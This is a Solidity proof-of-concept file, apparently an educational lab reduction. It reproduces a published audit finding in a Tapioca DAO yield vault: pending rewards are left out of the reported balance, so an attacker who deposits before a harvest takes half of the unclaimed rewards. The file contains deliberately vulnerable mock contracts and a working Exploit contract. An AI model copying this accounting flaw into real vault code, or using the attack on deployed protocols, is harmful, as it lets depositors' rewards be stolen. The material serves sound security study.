// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Tapioca DAO — [H-43] Accounted balance of GlpStrategy does not match
    withdrawable balance, allowing attackers to steal unclaimed rewards
    (Code4rena 2023-07-tapioca, reporter cergyk, finding #27533).

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: GlpStrategy._currentBalance only returns free GLP and ignores
    unclaimed rewards. YieldBox mints deposit shares from currentBalance(), so
    depositing while rewards are pending inflates the attacker's share of the
    pool. After harvest, withdrawing takes a pro-rata slice of those rewards.
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allow");
            if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract GlpStrategy {
    MockERC20 public immutable glp;
    uint256 public pendingRewards;

    constructor(MockERC20 _glp) {
        glp = _glp;
    }

    function deposit(uint256 amount, address from) external {
        glp.transferFrom(from, address(this), amount);
    }

    function withdraw(uint256 amount, address to) external {
        glp.transfer(to, amount);
    }

    function accrueRewards(uint256 amt) external {
        pendingRewards += amt;
    }

    function harvest() external {
        uint256 r = pendingRewards;
        pendingRewards = 0;
        glp.mint(address(this), r);
    }

    function _currentBalance() internal view returns (uint256 amount) {
        // @> VULN: only free GLP — ignores unclaimed rewards (pendingRewards).
        // FIX: include claimable reward value in the returned balance.
        amount = glp.balanceOf(address(this));
    }

    function currentBalance() external view returns (uint256) {
        return _currentBalance();
    }
}

contract YieldBox {
    GlpStrategy public immutable strategy;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(GlpStrategy s) {
        strategy = s;
    }

    function depositAsset(address from, address to, uint256 amount) external returns (uint256 share) {
        uint256 totalAmount = strategy.currentBalance();
        if (totalSupply == 0 || totalAmount == 0) {
            share = amount;
        } else {
            share = (amount * totalSupply) / totalAmount;
        }
        require(share > 0, "share");
        strategy.deposit(amount, from);
        totalSupply += share;
        balanceOf[to] += share;
    }

    function withdrawAsset(address from, address to, uint256 share) external returns (uint256 amount) {
        uint256 totalAmount = strategy.currentBalance();
        amount = (share * totalAmount) / totalSupply;
        balanceOf[from] -= share;
        totalSupply -= share;
        strategy.withdraw(amount, to);
    }
}

contract Exploit {
    MockERC20 public glp;
    GlpStrategy public strategy;
    YieldBox public yb;

    address public constant VICTIM = address(0xBEEF);

    uint256 public constant VICTIM_DEPOSIT = 1000 ether;
    uint256 public constant PENDING = 1000 ether;
    uint256 public constant ATTACKER_DEPOSIT = 1000 ether;
    uint256 public profit;

    constructor() {
        glp = new MockERC20();
        strategy = new GlpStrategy(glp);
        yb = new YieldBox(strategy);

        // Fund victim + attacker (this contract).
        glp.mint(VICTIM, VICTIM_DEPOSIT);
        glp.mint(address(this), ATTACKER_DEPOSIT);

        // Victim deposits first (approve YB path via strategy.deposit from victim).
        // Victim approves strategy (deposit pulls from from).
        // Use a small helper: transfer victim approval via mint-to-this then deposit as victim?
        // Strategy.deposit pulls from `from` — victim must approve strategy.
        // We can't prank. So pull path: mint to this, depositAsset with from=this for victim shares?
        // Cleaner: victim tokens held by this; depositAsset assigns shares to VICTIM.
        glp.mint(address(this), VICTIM_DEPOSIT); // extra for victim deposit from this
        glp.approve(address(strategy), type(uint256).max);
        yb.depositAsset(address(this), VICTIM, VICTIM_DEPOSIT);
    }

    function run() external {
        require(yb.balanceOf(VICTIM) == VICTIM_DEPOSIT, "victim shares");
        require(strategy.currentBalance() == VICTIM_DEPOSIT, "tvl");

        // Unclaimed rewards accrue but are invisible to currentBalance.
        strategy.accrueRewards(PENDING);
        require(strategy.currentBalance() == VICTIM_DEPOSIT, "pending ignored");

        // Attacker deposits while pending is invisible → same shares as if TVL were smaller.
        uint256 attackerShares = yb.depositAsset(address(this), address(this), ATTACKER_DEPOSIT);
        require(attackerShares == ATTACKER_DEPOSIT, "inflated 1:1 vs free GLP only");

        // Harvest materializes rewards into free GLP.
        strategy.harvest();
        require(
            strategy.currentBalance() == VICTIM_DEPOSIT + ATTACKER_DEPOSIT + PENDING,
            "harvested"
        );

        // Attacker withdraws → takes half of the previously unclaimed rewards.
        uint256 out = yb.withdrawAsset(address(this), address(this), attackerShares);
        profit = out - ATTACKER_DEPOSIT;
        require(profit == PENDING / 2, "harm: stole half of unclaimed rewards");
    }
}
